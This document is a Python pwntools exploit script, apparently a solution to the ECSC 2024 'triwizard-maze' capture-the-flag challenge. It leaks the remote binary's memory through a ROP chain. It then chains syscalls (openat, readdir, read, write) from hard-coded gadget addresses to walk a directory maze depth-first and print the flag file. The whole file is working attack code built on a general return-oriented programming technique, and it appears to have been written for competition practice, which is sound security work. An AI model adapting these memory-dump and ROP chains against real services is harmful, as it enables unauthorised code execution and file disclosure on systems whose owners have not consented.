#!/usr/bin/env python3
#
# @mebeim - 2024-05-20
#

import os
import sys
from re import compile
from tempfile import NamedTemporaryFile
from time import monotonic

from pwn import context, log, remote, flat, ELF
from pwnlib.constants.linux.i386 import SYS_readdir, AT_FDCWD
from pwnlib.log import Progress


HOST = os.getenv('HOST', 'triwizard-maze.challs.external.open.ecsc2024.it')
PORT = int(os.getenv('PORT', 38202))
FLAG_EXP = compile(rb'CCIT\{[^}]+\}')

EXE: ELF|None = None
RW_BUF: int|None = None
NEWLINE: int|None = None
REMOTE: remote|None = None
MAZE_PROGRESS: Progress|None = None
ROP_CHAIN_LENGTH = 1024

# Addr of this gadget: pop ebx ; pop esi ; pop edi ; pop ebp ; ret
CLEAN_STACK_GADGET = 0x13372339

# These are fixed given the dumped ELF (+ some reverse engineering to find them)
EXE_SYMBOLS: dict[str,int] = {
	'triwizard_cup_fname': 0x13375d60,
	'__syscall3'         : 0x133722cd,
	'print_str'          : 0x13372d29,
	'write_exact'        : 0x13372f58,
	'read_exact'         : 0x13372edc,
	'read'               : 0x133723af,
	'openat'             : 0x1337238f,
	'close'              : 0x133723e3,
	'go'                 : 0x13371f47
}


def connect():
	global REMOTE
	with context.local(log_level='error'):
		REMOTE = remote(HOST, PORT)


def close_remote():
	with context.local(log_level='error'):
		REMOTE.close()


def dump_mem(print_fn: int, addr: int, n: int) -> bytes:
	connect()
	chain = flat(print_fn, 0, addr, n).ljust(ROP_CHAIN_LENGTH, b'\0')
	REMOTE.sendafter(b' bytes):\n', chain)

	with context.local(log_level='warning'):
		res = REMOTE.recvall()

	close_remote()
	return res


def dump_elf() -> bytes:
	connect()
	REMOTE.recvuntil(b'print(const void *buf, size_t n) is at ')

	print_fn = int(REMOTE.recvline(), 0)
	base = print_fn & ~0xffff
	log.info('print_fn @ %#x', print_fn)
	log.info('ELF base @ %#x', base)

	chain = flat(print_fn, 0, base, 0x10000)
	REMOTE.sendlineafter(b'):\n', chain.ljust(ROP_CHAIN_LENGTH, b'\0'))

	with context.local(log_level='error'):
		elf = REMOTE.recvall()
		REMOTE.close()

	return elf


def send_chain(chain: bytes):
	# Re-start the go() function ro read the next chain after this one
	chain += call('go')

	assert len(chain) <= ROP_CHAIN_LENGTH, f'Chain too long: {len(chain)}'
	REMOTE.recvuntil(b' bytes):\n')
	REMOTE.send(chain.ljust(ROP_CHAIN_LENGTH, b'\0'))


def call(func: str, *args: int) -> bytes:
	assert 0 <= len(args) <= 4, args

	if len(args) == 0:
		clean_stack = ()
	else:
		clean_stack = CLEAN_STACK_GADGET + 4 - len(args)

	return flat(EXE_SYMBOLS[func], clean_stack, args)


def openat(dirfd: int, name: str):
	log.debug('openat(%d, "%s")', dirfd, name)

	name = name.encode() + b'\0'
	chain  = call('read_exact', 0, EXE_SYMBOLS['triwizard_cup_fname'], len(name))
	chain += call('openat', dirfd, EXE_SYMBOLS['triwizard_cup_fname'], 0, 0)
	chain += call('go')

	send_chain(chain)
	REMOTE.send(name)


def close(fd: int):
	send_chain(call('close', fd))


def listdir(dirfd: int) -> list[str]:
	# Skip "." and ".."
	chain = call('__syscall3', SYS_readdir, dirfd, RW_BUF, 0)
	chain += call('__syscall3', SYS_readdir, dirfd, RW_BUF, 0)

	# List at most 10 entries
	for _ in range(10):
		chain += call('__syscall3', SYS_readdir, dirfd, RW_BUF, 0)
		chain += call('print_str', RW_BUF + 4 + 4 + 2) # d_name
		chain += call('print_str', NEWLINE)

	send_chain(chain)

	res = []
	last = None

	for _ in range(10):
		name = REMOTE.recvline(keepends=False).decode()

		# Skip duplicates, if we get any it just means there are < 10 entries
		if name != last:
			res.append(name)
			last = name

	# If we get ".." it means there was nothing after "..", so this dir is empty
	if res == ['..']:
		return []
	return res


def dumpfd(fd: int):
	chain = call('read', fd, RW_BUF, 0x100)
	chain += call('write_exact', 1, RW_BUF, 0x100)
	send_chain(chain)
	return REMOTE.recvn(0x100)


def explore_maze(dirfd=None):
	if dirfd is None:
		openat(AT_FDCWD, "entry")
		dirfd = 2

	depth = dirfd - 1

	# Recursive DFS until we get to "flag"
	for fname in listdir(dirfd):
		MAZE_PROGRESS.status(f'(depth {depth:3d}){"-" * depth}>{fname}')

		if fname == 'triwizard_cup':
			openat(dirfd, fname)
			return dumpfd(dirfd + 1)

		# Returned FD will be dirfd + 1, completely predictable. We start
		# with FD 2 and always close FDs in the reverse opening order since we
		# are doing DFS. Therefore we will always have dirfd == depth + 1.
		openat(dirfd, fname)

		flag = explore_maze(dirfd + 1)
		if flag is not None:
			return flag

		close(dirfd + 1)

	return None


def dump_and_load_elf() -> bool:
	global EXE

	elf = dump_elf()
	if not elf:
		return False

	# Load dumped ELF and use pwntools' ROP to ensure everything works and the
	# dump is good
	with NamedTemporaryFile('wb') as f:
		f.write(elf)
		f.flush()
		EXE = ELF(f.name, checksec=True)

	return True


def run() -> bool:
	global RW_BUF, NEWLINE, MAZE_PROGRESS

	# Use .bss as R/W area
	RW_BUF = EXE.bss() + 0x10
	# Separator to use when printing directory entries
	NEWLINE = next(EXE.search(b'\n\0'))

	connect()

	MAZE_PROGRESS = log.progress('Exploring maze')
	start = monotonic()
	flag = explore_maze()
	elapsed = monotonic() - start

	if flag is None:
		MAZE_PROGRESS.failure('"triwizard_cup" file NOT found!')
		return False

	MAZE_PROGRESS.success('found "triwizard_cup" file!')
	match = FLAG_EXP.match(flag)

	if match is None:
		close_remote()
		log.failure(f'Failed, flag does not match! Took {elapsed:.2f} seconds.')
		return False

	log.success(f'Success! Took {elapsed:.2f} seconds.')
	print(match.group(0).decode())
	return True


def main():
	context(arch='i386')

	for _ in range(100):
		try:
			if dump_and_load_elf():
				break
		except EOFError:
			log.failure('EOFError, retrying...')
			pass
	else:
		sys.exit('Failed to dump ELF, exceeded 100 attempts!')

	for _ in range(100):
		try:
			if run():
				break
		except EOFError:
			if MAZE_PROGRESS:
				MAZE_PROGRESS.failure('EOF')
			log.failure('EOFError, retrying...')
			pass
	else:
		sys.exit('Failed to run exploit, exceeded 100 attempts!')


if __name__ == '__main__':
	main()
